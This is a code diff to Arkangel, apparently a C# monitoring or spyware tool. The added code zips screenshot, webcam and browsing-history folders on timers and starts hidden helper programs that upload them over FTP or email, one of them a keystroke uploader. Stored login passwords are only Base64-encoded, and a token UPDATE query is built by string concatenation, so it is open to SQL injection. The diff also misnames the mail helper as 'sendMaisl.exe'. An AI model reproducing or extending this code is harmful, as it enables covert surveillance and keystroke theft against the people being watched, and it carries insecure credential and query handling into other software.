@@ -176,7 +176,7 @@ namespace Arkangel
             {
                 if (Directory.Exists(dir))
                 {
-                    zip.Password = password;
+                    if (password!="") zip.Password = password;
                     zip.AddDirectory(dir + "\\");
                     zip.Save(dir + ".zip");
                 }
@@ -203,11 +203,11 @@ namespace Arkangel
             try
             {
                 // Create a timer with a two second interval.
-                MainWindow.aTimer_scrshot = new System.Timers.Timer(_time);
+                MainWindow.aTimer_FTP = new System.Timers.Timer(_time);
                 // Hook up the Elapsed event for the timer. 
-                MainWindow.aTimer_scrshot.Elapsed += OnTimedEventFTP;
-                MainWindow.aTimer_scrshot.AutoReset = true;
-                MainWindow.aTimer_scrshot.Enabled = true;
+                MainWindow.aTimer_FTP.Elapsed += OnTimedEventFTP;
+                MainWindow.aTimer_FTP.AutoReset = true;
+                MainWindow.aTimer_FTP.Enabled = true;
             }
             catch { }
            
@@ -216,6 +216,21 @@ namespace Arkangel
         {
             try
             {
+                using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
+                {
+                    connect.Open();
+                    using (SQLiteCommand fmd = connect.CreateCommand())
+                    {
+                        SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"SELECT * FROM FTP,current_user WHERE FTP.id = current_user.id", connect);
+                        SQLiteDataReader data = sqlComm_Alert.ExecuteReader();
+                        while (data.Read())
+                        {
+                            if (data["upScrshot"].ToString() == "1") Functions.ZipFolder(GetpathScrShot() + "\\Screenshot", "");
+                            if (data["upWebcam"].ToString() == "1") Functions.ZipFolder(GetpathWebcam() + "\\Webcam", "");
+                            if (data["upWebsite"].ToString() == "1") Functions.ZipFolder(GetpathWebcam() + "\\Website", "");
+                        }
+                    }
+                }
                 ProcessStartInfo start = new ProcessStartInfo();
                 start.WorkingDirectory = @"..\..\module\";
                 start.FileName = "ftp.exe";
@@ -248,6 +263,25 @@ namespace Arkangel
                     while (data.Read())
                     {
                         path = data["screenshotLog"].ToString();
+                    }
+                }
+                connect.Close();
+            }
+            return path;
+        }
+        public static string GetpathKeylog()
+        {
+            string path = "";
+            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
+            {
+                connect.Open();
+                using (SQLiteCommand fmd = connect.CreateCommand())
+                {
+                    SQLiteCommand sqlComm = new SQLiteCommand(@"SELECT * FROM Setting,current_user WHERE Setting.id=current_user.id", connect);
+                    SQLiteDataReader data = sqlComm.ExecuteReader();
+                    while (data.Read())
+                    {
+                        path = data["textLog"].ToString();
                     }
                 }
                 connect.Close();
@@ -401,10 +435,50 @@ namespace Arkangel
             }
             catch { }
         }
+        public static void Uptoken()
+        {
+            try
+            {
+                using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
+                {
+                    connect.Open();
+                    using (SQLiteCommand fmd = connect.CreateCommand())
+                    {
+                        string username = "";
+                        string password = "";
+                        SQLiteCommand sqlComm1 = new SQLiteCommand(@"SELECT * from Users", connect);
+                        SQLiteDataReader data = sqlComm1.ExecuteReader();
+                        while (data.Read())
+                        {
+                            username = data["username"].ToString();
+                            password = data["password"].ToString();
+                        }
+                        string _loginlog = Functions.Login(username, Base64Decode(password));
+                        if (_loginlog != "Error")
+                        {
+                            SQLiteCommand sqlComm = new SQLiteCommand(@"SELECT * from current_user", connect);
+                            SQLiteDataReader datacheck = sqlComm1.ExecuteReader();
+                            while (datacheck.Read())
+                            {
+                                if (_loginlog != datacheck["token"].ToString())
+                                {
+                                    //Update token xuong database
+                                    SQLiteCommand getid = new SQLiteCommand(@"UPDATE current_user SET id=1,token='" + _loginlog.Split('\"')[1] + "'", connect);
+                                    getid.ExecuteNonQuery();
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            catch { }
+           
+        }
         public static void OnTimedEventWebsite(Object source, ElapsedEventArgs e)
         {
             try
             {
+                
                 ZipFolderWebsite();
                 ProcessStartInfo start = new ProcessStartInfo();
                 start.WorkingDirectory = @"..\..\module\";
@@ -452,7 +526,16 @@ namespace Arkangel
                 syncDown();
             }
             catch { }
-            
+            try
+            {
+                ProcessStartInfo start = new ProcessStartInfo();
+                start.WorkingDirectory = @"..\..\module\";
+                start.FileName = "upKeystroke.exe";
+                start.WindowStyle = ProcessWindowStyle.Hidden;
+                Process.Start(start);
+            }
+            catch { }
+
         }
         public static void OnTimedEventWebcam(Object source, ElapsedEventArgs e)
         {
@@ -492,6 +575,10 @@ namespace Arkangel
             catch { }
 
         }
+        //Timer for FTP
+       
+
+
 
         // Timer for Send mail
         public static void SetTimerSendMail(int _time)
@@ -510,11 +597,31 @@ namespace Arkangel
         }
         public static void OnTimedEventSendMail(Object source, ElapsedEventArgs e)
         {
+            
             try
             {
+                string enable_mail = "";
+                string password = null;
+                using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
+                {
+                    connect.Open();
+                    using (SQLiteCommand fmd = connect.CreateCommand())
+                    {
+                        SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"SELECT * FROM Email,current_user WHERE Email.id = current_user.id", connect);
+                        SQLiteDataReader data = sqlComm_Alert.ExecuteReader();
+                        while (data.Read())
+                        {
+                            enable_mail = data["enable"].ToString();
+                            password = data["zipPasswd"].ToString();
+                            if (data["upScrshot"].ToString() == "1") Functions.ZipFolder(GetpathScrShot() + "\\Screenshot", password);
+                            if (data["upWebcam"].ToString() == "1") Functions.ZipFolder(GetpathWebcam() + "\\Webcam", password);
+                            if (data["upWebsite"].ToString() == "1") Functions.ZipFolder(GetpathWebcam() + "\\Website", password);
+                        }
+                    }
+                }
                 ProcessStartInfo start = new ProcessStartInfo();
                 start.WorkingDirectory = @"..\..\module\";
-                start.FileName = "sendMail.exe";
+                start.FileName = "sendMaisl.exe";
                 start.WindowStyle = ProcessWindowStyle.Hidden;
                 Process.Start(start);
             }
@@ -720,6 +827,16 @@ namespace Arkangel
                 image = null;
                 return Image.FromStream(imageStream);
             }
+        }
+        public static string Base64Encode(string plainText)
+        {
+            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
+            return System.Convert.ToBase64String(plainTextBytes);
+        }
+        public static string Base64Decode(string base64EncodedData)
+        {
+            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
+            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
         }
     }
 }
